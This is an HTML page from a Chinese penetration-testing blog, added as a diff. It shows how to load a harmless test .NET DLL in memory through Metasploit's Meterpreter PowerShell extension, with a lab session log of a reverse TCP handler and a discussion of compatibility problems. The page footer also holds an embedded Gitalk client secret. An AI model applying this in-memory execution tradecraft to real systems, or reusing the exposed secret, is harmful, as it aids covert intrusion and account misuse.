@@ -1,0 +1,412 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Metasploit,PowerShell,.NET,C#,MSF,meterpreter">
+
+
+<meta name="description" content="前言
+随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，
+虽然.NET和PowerShell可以相互调用但PowerShell的兼容性远不如.NET，
+...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    Metasploit/PowerShell内存加载执行.NET |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="Metasploit/PowerShell内存加载执行.NET">
+            
+            Metasploit/PowerShell内存加载执行.NET
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Dotnet/">.NET</a> <a class="category-link" href="/categories/Metasploit/">Metasploit</a> <a class="category-link" href="/categories/PowerShell/">PowerShell</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/Dotnet/" rel="tag">.NET</a> <a class="tag-none-link" href="/tags/C/" rel="tag">C#</a> <a class="tag-none-link" href="/tags/MSF/" rel="tag">MSF</a> <a class="tag-none-link" href="/tags/Metasploit/" rel="tag">Metasploit</a> <a class="tag-none-link" href="/tags/PowerShell/" rel="tag">PowerShell</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/01/10</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1925</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <h3 id="前言">前言</h3>
+<p>随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，<br>
+<a target="_blank" rel="noopener" href="http://xn--otxv76b.xn--NETPowerShellPowerShell-f820by8fwvc40ddvyejrjkevv2cm2ohp8a8h3ml7j65d4s2x5t4a.NET">虽然.NET和PowerShell可以相互调用但PowerShell的兼容性远不如.NET</a>，<br>
+且想要执行PowerShell，前提也需要.net环境，效率方面也是程序比脚本强<br>
+同样都可内存加载，为何非要鼓吹PowerShell呢，很多PowerShell框架或模块，<br>
+兼容性和稳定性并不好都没人说，好了不扯太远，下面我们来看一下如何使用<br>
+MSF中Meterpreter的powershell模块在内存中执行.NET程序集。</p>
+<h3 id="0x001-C-DLL">0x001 C# DLL</h3>
+<figure class="highlight c#"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">msftest</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">msf</span></span><br><span class="line">    {</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">run</span>()</span></span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"msftest by k8gege"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="0x002-PowerShell">0x002 PowerShell</h3>
+<p>首先我们先通过系统自带PowerShell执行DLL，看DLL功能是否正常。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\k8gege\&gt; [<span class="type">Reflection.Assembly</span>]::LoadFile(<span class="string">"C:\Users\k8gege\msftest.dll"</span>)</span><br><span class="line"></span><br><span class="line">GAC    Version        Location</span><br><span class="line"><span class="literal">---</span>    <span class="literal">-------</span>        <span class="literal">--------</span></span><br><span class="line">False  v2.<span class="number">0.50727</span>     C:\Users\k8gege\\msftest.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\k8gege\&gt; [<span class="type">msftest.msf</span>]::run()</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="0x003-MSF加载-NET">0x003 <a target="_blank" rel="noopener" href="http://xn--MSF-3w2ej69y.NET">MSF加载.NET</a></h3>
+<p>将DLL复制至MSF服务器,使用Meterpreter的powershell模块在内存中执行DLL</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.61:443 -&gt; 192.168.1.5:54647) at 2019-12-19 20:36:14 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; load powershell</span><br><span class="line">Loading extension powershell...Success.</span><br><span class="line">meterpreter &gt; powershell_import msftest.dll</span><br><span class="line">[+] File successfully imported. No result was returned.</span><br><span class="line">meterpreter &gt; powershell_execute <span class="string">"[msftest.msf]::run()"</span></span><br><span class="line">[+] Command execution completed:</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="0x004-关于兼容性">0x004 关于兼容性</h3>
+<p>1.MSF中的powershell模块稳定性和兼容性并不好，K8在两台WIN7中测试<br>
+有一台刚加载powershell模块，MET就崩溃导致权限丢失（而且还弹框）<br>
+再者某些程序集和PowerShell脚本也不能正常加载，有些功能也会失效。<br>
+这一点Cobalt Strike做得比较好，对.net和PowerShell兼容性80%吧，<br>
+.NET加载功能好比虚拟机加载操作系统，CS无法执行部分.NET函数很正常<br>
+正如Ladon在CS下执行，部分功能直接不可用，部分功能执行还有问题。<br>
+有些人可能说是Ladon的问题，当然说得也没错，但没想过CS的问题吗<br>
+它提供.NET程序执行的功能,只是使用了几个微软API接口，并不完全<br>
+试想一下被微软收购做了10几年.NET跨平台的MONO也不能保证100%兼容<br>
+CS确实是非常强大我承认(不然不使用)，但强大并不等于它就没有问题<br>
+它的缺点和优点一样，非常多，你用久了懂在理懂的功能多了就会发现<br>
+<a target="_blank" rel="noopener" href="http://xn--MONO-jb5f8lq8gk7dffw86ez6frpap411bpr5atkphkb.NET">MONO那么大都不能保证完全兼容.NET</a>，CS区区几行代码能完全兼容吗?</p>
+<p>我上面说的Ladon在CS下有问题，说Ladon也有问题没错，是因为我认为<br>
+写一个好的渗透工具，应尽量兼容各种环境。不过CS也只是使用的工具，<br>
+还不是目标环境，要是连工具自身有BUG的模块都能完全兼容，就是完美。</p>
+<p>目前Ladon有几个模块不兼容CS，在CNA脚本里有注明，用前必看。其它模块<br>
+可能在CS下使用远不如EXE好用，特别是那些没把时间改成3秒内的，默认60秒<br>
+才有回显，说成是Ladon扫描慢(即便改成0秒也慢)，因为CS无法完美快速回显。<br>
+看看CS自带的简单端口扫描或其它扫描，光扫几台机器，CS的回显就很慢吧。<br>
+何况Ladon还是外置插件，如Ladon扫描百度子域名很快，但在CS下回显很慢，<br>
+并不是Ladon扫得慢，好比把水管前面接一根吸管，要装满一桶水，能快吗。<br>
+Ladon扫描很快如同水管，但CS回显如同吸管，水管里的水再快也会因吸管变慢。</p>
+<p>2.powershell模块也支持EXE程序，但需要把.exe改成.dll后缀才能加载。<br>
+因为通过powershell加载，如果通过系统本身的PowerShell加载都不正常，<br>
+MSF加载也会失败，因为MSF并不是虚拟一个.NET加载功能。</p>
+<p>如下所示，有时通过系统PowerShell加载ex一样报错<br>
+PS C:\Users\k8gege&gt; [Reflection.Assembly]::LoadFile(“C:\Users\k8gege\test.exe”)<br>
+使用“1”个参数调用“LoadFile”时发生异常:“生成此程序集的运行时比当前加载的运<br>
+行时新,无法加载此程序集。 (异常来自 HRESULT:0x8013101B)”<br>
+所在位置 行:1 字符: 32</p>
+<ul>
+<li>[Reflection.Assembly]::LoadFile &lt;&lt;&lt;&lt; (“C:\Users\k8gege\test.exe”)
+<ul>
+<li>CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</li>
+<li>FullyQualifiedErrorId : DotNetMethodException</li>
+</ul>
+</li>
+</ul>
+<h3 id="0x005-结论">0x005 结论</h3>
+<p>虽然本文介绍了通过MSF加载执行.NET程序的方法，但是从兼容性以及稳定性来看<br>
+目前在实战中还是慎用为好，以免因为弹框或崩溃导致权限丢失。不能因为MSF强大<br>
+而无脑使用它的所有功能，程序强大并不代表所有功能模块都稳定好用。只需要使用<br>
+稳定好用的模块功能即可，其它模块可以等作者更新稳定后再使用。</p>
+<p>注意：我这里说的是不推荐用MSF中的PowerShell加载模块，并不是说MSF。<br>
+如同说霍金身体残废，但却没有说他是废人哦，何况只是说他一只手受伤。</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/36010.html" class="pre-post btn btn-default" title="PhpStudy BackDoor GetShell">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            PhpStudy BackDoor GetShell</span>
+    </a>
+    
+    
+    <a href="/p/72f1fea6.html" class="next-post btn btn-default" title="〖工具〗K8tools工具合集">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖工具〗K8tools工具合集</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x001-C-DLL"><span class="toc-text">0x001 C# DLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x002-PowerShell"><span class="toc-text">0x002 PowerShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x003-MSF%E5%8A%A0%E8%BD%BD-NET"><span class="toc-text">0x003 MSF加载.NET</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x004-%E5%85%B3%E4%BA%8E%E5%85%BC%E5%AE%B9%E6%80%A7"><span class="toc-text">0x004 关于兼容性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x005-%E7%BB%93%E8%AE%BA"><span class="toc-text">0x005 结论</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
